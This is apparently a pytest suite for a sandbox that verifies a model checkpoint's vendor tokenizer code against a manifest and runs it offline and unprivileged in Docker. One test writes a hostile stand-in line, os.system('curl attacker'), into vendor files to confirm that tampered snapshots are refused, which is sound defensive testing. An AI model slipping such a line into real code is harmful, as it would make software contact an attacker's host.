import json
import pathlib
import subprocess

import pytest

from bellwether import sandbox
from bellwether.inputs import oracle_inputs
from bellwether.manifest import load_manifest
from bellwether.record import vendor

REVISION = "a" * 40


@pytest.fixture
def snapshot(tmp_path) -> pathlib.Path:
    """A checkpoint whose tokenizer is the vendor's code, as its snapshot holds it, with files no oracle reads."""
    directory = tmp_path / "snapshot"
    directory.mkdir()
    config = {"auto_map": {"AutoTokenizer": ["tokenization_x.XTokenizer", None]}, "eos_token": "<eos>"}
    (directory / "tokenizer_config.json").write_text(json.dumps(config))
    (directory / "tokenization_x.py").write_text("from .encoding_x import encode\n")
    (directory / "encoding_x.py").write_text("def encode(): ...\n")
    (directory / "tiktoken.model").write_bytes(b"vocabulary")
    (directory / "generation_config.json").write_text(json.dumps({"eos_token_id": 1}))
    (directory / "README.md").write_text("A card.")
    (directory / "model.safetensors").write_bytes(b"weights")
    return directory


def manifest_for(fixtures: pathlib.Path, model: str, inputs: dict, group: str | None = None):
    path = fixtures / model.split("/")[-1].lower() / "manifest.toml"
    path.parent.mkdir(parents=True)
    lines = [f'model = "{model}"', f'revision = "{REVISION}"', *([f'group = "{group}"'] if group else [])]
    lines += ["", "[authority]", 'render = ["vendor-code"]', "", "[inputs]"]
    lines += [f'"{name}" = "{digest}"' for name, digest in inputs.items()]
    path.write_text("\n".join(lines) + "\n")
    return load_manifest(path)


@pytest.fixture
def listed(tmp_path, snapshot, monkeypatch):
    """The checkpoint's manifest, listing its inputs, with the snapshot standing for the Hub's."""
    monkeypatch.setattr(sandbox, "checkpoint_dir", lambda model, revision: snapshot)
    monkeypatch.setattr(sandbox, "oracle_inputs", lambda model, revision: oracle_inputs(str(snapshot), "local"))
    return manifest_for(tmp_path / "fixtures", "acme/X-1", oracle_inputs(str(snapshot), "local"))


def test_a_snapshot_whose_files_match_the_manifest_is_the_one_run(listed, snapshot):
    assert sandbox.checked_snapshot(listed) == snapshot


@pytest.mark.parametrize("change", ["encoding_x.py", "tiktoken.model", "added.py"])
def test_a_snapshot_whose_vendor_files_differ_from_the_manifest_is_refused(listed, snapshot, change):
    (snapshot / change).write_text("import os; os.system('curl attacker')\n")
    with pytest.raises(sandbox.Refused, match=f"these files differ from the manifest: .*{change}"):
        sandbox.checked_snapshot(listed)


def test_the_context_holds_only_the_listed_files_the_corpus_of_the_kind_and_the_group(listed, snapshot, tmp_path):
    corpus, fixtures, context = tmp_path / "corpus", tmp_path / "fixtures", tmp_path / "context"
    for kind in ("render", "parse"):
        (corpus / kind).mkdir(parents=True)
        (corpus / kind / "common.jsonl").write_text("{}\n")
    context.mkdir()
    sandbox.stage(listed, snapshot, "render", fixtures, corpus, context)
    files = sorted(p.relative_to(context).as_posix() for p in context.rglob("*") if p.is_file())
    held = f"hf/hub/models--acme--X-1/snapshots/{REVISION}"
    assert files == sorted(
        [
            "Dockerfile",
            *(f"{held}/{name}" for name in listed.inputs),
            "work/corpus/render/common.jsonl",
            "work/fixtures/x-1/manifest.toml",
        ]
    )
    assert (context / "Dockerfile").read_text().startswith(f"FROM {sandbox.BASE_TAG}\n")


def test_the_context_carries_the_caches_marks_for_files_the_repository_does_not_have(listed, snapshot, tmp_path):
    # Offline, the oracles take a file the cache marks absent (`.no_exist`) as absent, and refuse one it does not.
    repo = tmp_path / "hub" / "models--acme--X-1"
    held = repo / "snapshots" / REVISION
    held.parent.mkdir(parents=True)
    held.symlink_to(snapshot)
    (repo / ".no_exist" / REVISION).mkdir(parents=True)
    (repo / ".no_exist" / REVISION / "chat_template.jinja").write_text("")
    corpus, context = tmp_path / "corpus", tmp_path / "context"
    (corpus / "render").mkdir(parents=True)
    context.mkdir()
    sandbox.stage(listed, held, "render", tmp_path / "fixtures", corpus, context)
    marks = context / "hf" / "hub" / "models--acme--X-1" / ".no_exist" / REVISION
    assert [p.name for p in marks.iterdir()] == ["chat_template.jinja"]


def test_the_group_brought_back_replaces_the_hosts_so_a_set_the_run_removed_is_gone(tmp_path):
    group = tmp_path / "fixtures" / "x-1"
    (group / "render").mkdir(parents=True)
    (group / "render" / "removed.jsonl").write_text("{}\n")
    (group / "manifest.toml").write_text("before")
    fresh = sandbox.landing(group)
    (fresh / "render").mkdir()
    (fresh / "render" / "kept.jsonl").write_text("{}\n")
    (fresh / "manifest.toml").write_text("after")
    sandbox.replace_group(fresh, group)
    files = sorted(p.relative_to(group).as_posix() for p in group.rglob("*") if p.is_file())
    assert files == ["manifest.toml", "render/kept.jsonl"]
    assert (group / "manifest.toml").read_text() == "after"
    assert sorted(p.name for p in group.parent.iterdir()) == ["x-1"]


def test_the_run_has_no_network_a_read_only_root_no_privileges_limits_and_no_credential(listed):
    args = sandbox.run_args("run-1", "run-1-work", "run-image", "sha256:base", listed, "parse")
    pairs = set(zip(args, args[1:], strict=False))
    for pair in [
        ("--network", "none"),
        ("--user", sandbox.USER),
        ("--cap-drop", "ALL"),
        ("--security-opt", "no-new-privileges"),
        ("--pids-limit", "512"),
        ("--memory", "6g"),
        ("--env", f"{vendor.SANDBOX_ENV}=1"),
        ("--env", "HF_HUB_OFFLINE=1"),
    ]:
        assert pair in pairs, pair
    assert "--read-only" in args
    assert not any("TOKEN" in arg for arg in args)
    assert not any(arg.startswith("--env-file") or arg == "--privileged" for arg in args)
    command = args[args.index("run-image") + 1 :]
    assert command[:2] == ["timeout", str(sandbox.SECONDS)]
    assert command[2:] == [
        "bellwether", "record", "--model", "acme/X-1", "--kind", "parse", "--oracle", "vendor",
        "--fixtures", "/work/fixtures", "--corpus", "/work/corpus",
    ]  # fmt: skip


def test_a_refused_checkpoint_never_reaches_docker(listed, snapshot, tmp_path, monkeypatch, capsys):
    def no_docker(*args, **kwargs):
        raise AssertionError(f"docker ran: {args}")

    monkeypatch.setattr(subprocess, "run", no_docker)
    (snapshot / "tokenization_x.py").write_text("print('changed')\n")
    namespace = type("Args", (), {"model": "acme/X-1", "kind": "render", "fixtures": tmp_path / "fixtures"})
    assert sandbox.run(namespace) == 1
    assert "differ from the manifest" in capsys.readouterr().err


def test_a_group_member_is_refused_before_its_files_are_read(tmp_path, snapshot, monkeypatch, capsys):
    fixtures = tmp_path / "fixtures"
    manifest_for(fixtures, "acme/X-1", oracle_inputs(str(snapshot), "local"))
    manifest_for(fixtures, "acme/X-1-Mini", {"tokenizer_config.json": "0" * 64}, group="x-1")
    monkeypatch.setattr(sandbox, "checkpoint_dir", lambda *_: pytest.fail("read"))
    namespace = type("Args", (), {"model": "acme/X-1-Mini", "kind": "render", "fixtures": fixtures})
    assert sandbox.run(namespace) == 1
    assert "record its primary" in capsys.readouterr().err
